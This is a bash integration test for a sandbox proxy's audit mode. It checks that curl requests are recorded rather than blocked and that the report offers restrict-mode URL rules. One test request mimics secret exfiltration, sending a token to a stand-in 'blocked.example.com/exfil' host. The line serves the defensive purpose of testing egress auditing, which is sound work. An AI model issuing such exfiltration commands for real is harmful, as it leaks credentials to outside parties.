#!/bin/bash
# Audit-mode counterpart to integration-test-inspect-restrict.sh: with no
# rules configured, everything must be allowed and recorded, and the report
# must offer a restrict-mode allowed_url_rules example built from what was
# actually observed.
set -uo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/driver-helpers.sh"

require_local_image inspect

echo ""
echo "=== Inspect Engine Integration Test (audit) ==="
echo ""

trap 'fixture_down inspect' EXIT
fixture_up inspect

TMPDIR=$(mktemp -d)

echo "--- running the sandboxed step (proxy_engine: inspect, audit mode) ---"
run_step inspect "$TMPDIR/step" \
  INPUT_PROXY_MODE="audit" \
  INPUT_RUN="
S='curl -sS --max-time 10'
\$S https://allowed.example.com/public/pkg.tgz
\$S -X POST https://api.example.com/v1/thing
\$S https://blocked.example.com/exfil?token=SECRET-VALUE
true"
RUN_EXIT=$?
cat "$TMPDIR/step.log"

echo ""
echo "--- exit code: $RUN_EXIT ---"
if [ "$RUN_EXIT" = "0" ]; then
  pass "audit mode enforced nothing, so the step succeeded"
else
  fail "the step failed in audit mode (should never refuse anything)"
fi

echo ""
echo "--- report assertions (Job Summary) ---"
SUMMARY=$(cat "$TMPDIR/step.md")
assert_report_complete

assert_summary_contains "📋 Audited Hosts" "audited-hosts heading present"
assert_summary_contains "| allowed.example.com:443 | HTTPS |" "allowed.example.com:443 audited"
assert_summary_contains "| blocked.example.com:443 | HTTPS |" "blocked.example.com:443 audited (nothing enforced)"
if grep -qF "🚫 Blocked" <<< "$SUMMARY"; then
  fail "audit mode produced a Blocked Hosts table"
else
  pass "no Blocked Hosts table in audit mode"
fi
assert_summary_contains "Switch to restrict mode" "restrict-mode example offered"
assert_summary_contains "allowed_url_rules: |" "restrict-mode example is offered as URL rules"
assert_summary_contains "GET https://allowed.example.com/public/pkg.tgz" "the example includes what was actually observed"
assert_summary_contains "POST https://api.example.com/v1/thing" "the example keeps the method it actually saw"
assert_summary_contains "GET https://blocked.example.com/exfil" "the example includes a host audit merely observed, for the reader to remove"

rm -rf "$TMPDIR"

assert_results
